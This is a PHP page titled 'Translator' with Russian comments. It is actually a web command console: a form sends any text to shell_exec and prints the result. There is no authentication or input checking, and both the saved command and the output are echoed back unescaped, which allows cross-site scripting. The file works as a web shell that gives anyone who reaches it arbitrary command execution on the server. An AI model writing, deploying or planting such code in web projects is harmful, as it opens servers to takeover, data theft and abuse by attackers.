<?php
// создаем сесию для сохранение набраного текста
session_start();
// Проверяем нажата ли кнопка send
if (isset($_POST['send'])) {
    // Проверяем что нам что то пришло, если нечего не пришло то выдаем пустую троку
    $text = isset($_POST['text']) ? $_POST['text'] : '';
    // Помешаем в сесию то что пришло
    $_SESSION['command'] = $text;
    // Перекидываем команду в консоль
    $output = shell_exec($text);
    // Если нечего не пришло, то будем считать что это ошибка
    if (!$output) {
        $output = 'Error: command not found';
    }
}
?>

<!DOCTYPE html>
<html lang="ru" xmlns="http://www.w3.org/1999/html">     <!-- язык контента -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">            <!-- Что бы работал для броузера IE  -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  <!-- для мобильной версии размер -->
    <title>Translator</title>
    <style>
        body {
            background-color: #DCDCDC;
            margin-left: 0;
        }

        .wrap {
            max-width: 1000px;        /* Не дает шире стать */
            min-width: 320px;        /* Для ползунка прокрутки */
            margin: 100px auto;          /* Центрирование */
        }

        .wrap .translate {           /* выравнивание */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .wrap .translate .post {          /* блок для правильного отображение */
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: #00FFFF;
            height: auto;

        }

        .wrap .post form {              /* выравнивание */
            display: flex;
            flex-direction: column;
        }

        .wrap .post form label {         /* стили для метки */
            display: flex;
            flex-direction: column;
            text-align: center;
            background-color: #7FFFD4;
            padding: 5px;
            margin: 3px;
        }

        .wrap .post form .text {           /* стили для поле вода текста */
            display: block;
            width:auto;
            height:150px;
            padding: 5px 10px 5px 10px;
            margin: 7px;
        }

        .wrap .post form input {
            display: block;
        }

        .wrap .post span {                /* стили для вывода текста */
            display: block;
            background-color: #E0FFFF;
            margin: 20px;
            padding: 10px;
            border: 3px solid black;
            font-size: 1rem;
            white-space: pre-wrap;
        }

    </style>
</head>
<body>
<div class="wrap">
    <div class="translate">
        <div class="post">
            <form  method="post" >
                <label> Ведите команду, для написание нескольких команд используйте соединитель &&
                    <textarea wrap="soft" class="text" name="text" id="text" autocomplete="on"  autofocus
                              placeholder="Ведите команду"><?php echo$_SESSION['command']?></textarea>
                </label>
                <input type="submit" value="Отправить" name="send">
            </form>
            <span><?php echo "<pre>$output</pre>"; ?></span>
        </div>
        <p><a href="/">Вернутся назад</a></p>
    </div>
</div>
</body>
</html>















